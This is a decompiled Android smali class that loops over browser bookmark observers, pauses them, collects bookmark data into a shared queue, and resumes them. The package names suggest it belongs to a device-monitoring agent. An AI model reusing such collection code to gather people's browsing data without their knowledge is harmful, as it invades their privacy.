.class public Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;
.super Ljava/lang/Object;
.source "BrowserBookmarkLister.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "BrowserBookmarkLister"


# instance fields
.field protected browserBookmarkObservers:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;",
            ">;"
        }
    .end annotation
.end field

.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserBookmarkData;",
            ">;"
        }
    .end annotation
.end field

.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Ljava/util/ArrayList;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/BrowserBookmarkData;",
            ">;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/util/ArrayList<",
            "Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 30
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 18
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->context:Lcom/hp/vd/context/Context;

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->browserBookmarkObservers:Ljava/util/ArrayList;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 31
    iput-object p1, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 32
    iput-object p2, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->context:Lcom/hp/vd/context/Context;

    .line 33
    iput-object p3, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 34
    iput-object p4, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->browserBookmarkObservers:Ljava/util/ArrayList;

    .line 35
    iput-object p5, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    .line 47
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->browserBookmarkObservers:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 48
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;

    .line 50
    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->deactivate()Z

    goto :goto_0

    .line 57
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->browserBookmarkObservers:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_1
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 58
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;

    .line 60
    new-instance v9, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkCollector;

    .line 61
    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->getSource()I

    move-result v3

    .line 62
    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->getUri()Landroid/net/Uri;

    move-result-object v4

    iget-object v5, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->context:Lcom/hp/vd/context/Context;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v8, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->log:Lcom/hp/vd/agent/log/IWriter;

    move-object v2, v9

    invoke-direct/range {v2 .. v8}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkCollector;-><init>(ILandroid/net/Uri;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 71
    invoke-virtual {v9}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkCollector;->collect()V

    goto :goto_1

    .line 77
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkLister;->browserBookmarkObservers:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_2
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 78
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;

    .line 80
    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/browser/BrowserBookmarkObserver;->activate()Z

    goto :goto_2

    :cond_2
    return-void
.end method
